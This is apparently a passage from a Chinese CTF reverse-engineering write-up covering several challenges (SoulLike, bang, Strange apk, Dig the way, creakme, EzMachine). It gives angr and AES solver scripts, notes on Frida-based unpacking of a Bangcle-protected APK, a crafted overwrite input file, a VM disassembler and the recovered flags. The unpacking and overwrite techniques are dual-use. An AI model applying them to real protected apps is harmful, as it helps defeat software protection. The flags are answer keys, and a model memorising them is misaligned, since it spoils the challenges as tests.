class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">9</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">8</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">9</span>,<span class="number">3</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> dg03[]   = &#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">6</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">8</span>,<span class="number">0</span>,<span class="number">9</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">3</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">0</span>,<span class="number">4</span>&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> flag[<span class="number">81</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">81</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(dg03[i]!=sudoku[i])&#123;</span><br><span class="line">            flag[cnt]=sudoku[i];</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt;i++)&#123;</span><br><span class="line">        flag[i]+=<span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        flag[i]=flag[i]+<span class="number">20</span>;</span><br><span class="line">        flag[i]=flag[i]&amp;<span class="number">0xF3</span>|~flag[i]&amp;<span class="number">0xC</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt/<span class="number">2</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> t=flag[i];</span><br><span class="line">        flag[i]=flag[i+cnt/<span class="number">2</span>];</span><br><span class="line">        flag[i+cnt/<span class="number">2</span>]=t;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;cnt;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> t=flag[i];</span><br><span class="line">        flag[i]=flag[i+<span class="number">1</span>];</span><br><span class="line">        flag[i+<span class="number">1</span>]=t;</span><br><span class="line">    &#125;</span><br><span class="line">    printArray(<span class="string">&quot;flag&quot;</span>,flag,cnt);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][ACTF新生赛2020]SoulLike

1. 前4个字节为actf

2. 长度为11

3. 验证函数超级大

   rbp-0x58保存用户输入指针

4. angr一把梭(因为看了这个函数之后，发现无非就是异或相加之类的，很适合angr去求解)

   actf&#123;b0Nf|Re_LiT!

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;./SoulLike&#x27;</span>)</span><br><span class="line">state = p.factory.entry_state()</span><br><span class="line">s = p.factory.simulation_manager(state)</span><br><span class="line">s.explore(find=<span class="number">0x411065</span>,avoid=<span class="number">0x411028</span>)</span><br><span class="line">print(s.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>

看了wp之后发现自己粗心了，如果错了会告诉哪一位错了，所以可以按位爆破

## [rev][网鼎杯 2020 青龙组]bang

1. 梆梆加固

2. 使用frida脱壳[GitHub - GuoQiang1993/Frida-Apk-Unpack](https://github.com/GuoQiang1993/Frida-Apk-Unpack)

   网上有个之前的方法，具体看了一下，那个梆梆加固似乎没调用OpenMemory函数，所以通过hook OpenMemory函数已经不管用了。这个最新版的Hook了OpenCommon。似乎也是我手机的问题，Android 7。具体要等后续手动分析壳

   过程：通过 /proc/pid/maps查看应用对应的映射，找到相应的库，使用IDA分析

3. 使用dex2jar分析

4. 得到flag

flag&#123;borring_things&#125;

## [rev][SCTF2019]Strange apk

1. 前12个base64编码

2. 然后取奇数号字符

sctf&#123;W3lc0me~t0_An4r0id-w0rld&#125;

## [rev]Dig the way

1. 以文件作为输入

2. 注意文件是可能覆盖v8的

3. v8[3]=0&amp;&amp;v8[3]=func3(v8,2,3)=abs(v8[3])-abs(v8[3]+v8[2])+abs(v8[2])+2

   v8[2]=func2(v8,1,2)=abs(v8[1]+v8[2])-abs(v8[2])-abs(v8[1])+2

   v8[1]=1

   swap(v8[0],v8[1])

   发现不可能满足条件，遂寻找wp

4. 第一次循环交换的是v8[v12]和v8[v13]，所以可以直接覆盖v12和v13，达成函数的交换

   v8[2]=abs(v8[1])+abs(v8[2])-abs(v8[1]+v8[2])+2

   v8[3]=abs(v8[2]+v8[3])-abs(v8[2])-abs(v8[1])+2

5. 经过计算v8[2]=1,v8[3]=-1

   Offset      0  1  2  3  4  5  6  7   8  9 10 11 12 13 14 15

   00000000   3F 3F 3F 3F 3F 3F 3F 3F  3F 3F 3F 3F 3F 3F 3F 3F   
   00000016   3F 3F 3F 3F 33 33 33 33  33 33 33 33 01 00 00 00   
   00000032   FF FF FF FF 07 00 00 00  08 00 00 00  

flag: 8cda1bdb68a72a392a3968a71bdb8cda

## [rev][SCTF2019]creakme

1. 进入程序

2. 跟踪输入发现AES算法(使用PEID扫描也可以)

3. 调试发现初始向量，密钥扩展函数找到密钥

4. 密文使用base64加密了

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">key = <span class="string">b&#x27;sycloversyclover&#x27;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">b&#x27;nKnbHsgqD3aNEB91jB3gEzAr+IklQwT1bSs3+bXpeuo=&#x27;</span></span><br><span class="line">c = base64.b64decode(s)</span><br><span class="line">print(len(c),c)</span><br><span class="line">aes = AES.new(key=key,mode=AES.MODE_CBC,iv=<span class="string">b&#x27;sctfsctfsctfsctf&#x27;</span>)</span><br><span class="line">p = aes.decrypt(c)</span><br><span class="line">print(p)</span><br></pre></td></tr></table></figure>

## [rev][GKCTF2020]EzMachine

1. IDA搜索字符串发现不了什么，但是命令行有输出，在导入表里面发现WriteFile和WriteConsoleW

   分别在这两个函数位置下断点，发现程序使用WriteFile输出

2. 程序似乎加了壳，可以使用调试器加载，然后在要输出plz input的时候使用Scylla插件dump下来继续分析

3. WriteFile断下后，回溯分析，找到主函数D61580

4. 发现这是个虚拟机程序

5. 流程

   小写字母全部异或71后+1

   大写字母全部异或75后-1

   所有字符都除16，商和余数保存

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># opcode</span></span><br><span class="line">opc = [<span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x3</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x11</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x11</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x2b</span>, <span class="number">0x0</span>, <span class="number">0x14</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x61</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x1a</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7a</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0x1a</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x47</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x41</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x5a</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xf</span>, <span class="number">0x24</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x4b</span>, <span class="number">0xa</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x10</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xd</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xb</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0x13</span>, <span class="number">0x1</span>, <span class="number">0x2</span>, <span class="number">0x4</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xc</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xe</span>, <span class="number">0x5b</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x22</span>, <span class="number">0xc</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xd</span>, <span class="number">0x59</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x1</span>, <span class="number">0x6</span>, <span class="number">0x2</span>, <span class="number">0x1</span>, <span class="number">0xb</span>, <span class="number">0x4e</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0x5</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xff</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0 nop eip+=1</span></span><br><span class="line"><span class="string">1 v0=[eip+1],v1=[eip+2],reg[v0]=v1 eip+=3</span></span><br><span class="line"><span class="string">2 v0=[eip+1],push v0</span></span><br><span class="line"><span class="string">3 push reg[v0]</span></span><br><span class="line"><span class="string">4 pop reg[v0]</span></span><br><span class="line"><span class="string">5 output</span></span><br><span class="line"><span class="string">6 reg[v0]+=reg[v1]</span></span><br><span class="line"><span class="string">7 reg[v0]-=reg[v1]</span></span><br><span class="line"><span class="string">8 reg[v0]*=reg[v1]</span></span><br><span class="line"><span class="string">9 两个寄存器分别保存reg[v0]/reg[v1]的除数和余数</span></span><br><span class="line"><span class="string">10 reg[v0]^=reg[v1]</span></span><br><span class="line"><span class="string">11 eip=3*v0-3</span></span><br><span class="line"><span class="string">12 reg[v0]-reg[v1]并将结果保存在标志寄存器</span></span><br><span class="line"><span class="string">13 lags=0: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">14 flags=1: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">15 flags&gt;0: eip=3*v0-3，否则eip+=3</span></span><br><span class="line"><span class="string">16 flags&lt;0: </span></span><br><span class="line"><span class="string">17 输入,DA5BA8存储字符串,DA5BDC存储长度</span></span><br><span class="line"><span class="string">18 某加密函数</span></span><br><span class="line"><span class="string">19 reg[v0]=stack[DA5BD0+reg[v1]]</span></span><br><span class="line"><span class="string">20 reg[v0]=DA5BA8[reg[v1]]</span></span><br><span class="line"><span class="string">FF exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">eip = <span class="number">0</span></span><br><span class="line">esp = <span class="number">0</span></span><br><span class="line">flags=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> eip&lt;len(opc):</span><br><span class="line">    inst = opc[eip]</span><br><span class="line">    v0=opc[eip+<span class="number">1</span>]</span><br><span class="line">    v1=opc[eip+<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> inst==<span class="number">0</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]=%d&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">2</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;push %d;esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">3</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp+=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;push reg[%d];esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">4</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        esp-=<span class="number">1</span></span><br><span class="line">        print(<span class="string">&#x27;pop reg[%d]; esp=%d&#x27;</span>%(v0,esp))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">5</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;output&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">6</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]+=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">7</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]-=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">8</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]*=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">9</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]/reg[%d] ;--------&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">10</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;reg[%d]^=reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">11</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jmp %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">12</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;cmp reg[%d],reg[%d]&#x27;</span>%(v0,v1))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">13</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;je %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">14</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jne %02X&#x27;</span>%(<span class="number">3</span>*v0<span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">15</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jg %02X&#x27;</span>%(v0*<span class="number">3</span><span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">16</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;jl %02X&#x27;</span>%(v0*<span class="number">3</span><span class="number">-3</span>))</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">17</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;get&#x27;</span>)</span><br><span class="line">        eip+=<span class="number">3</span></span><br><span class="line">    <span class="keyword">elif</span> inst==<span class="number">18</span>:</span><br><span class="line">        print(<span class="string">&#x27;%04X: &#x27;</span> %eip,end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">        print(<span class="string">&#x27;encrypt&#x27;</span>)</span><br><span class="line">        eip+=<span 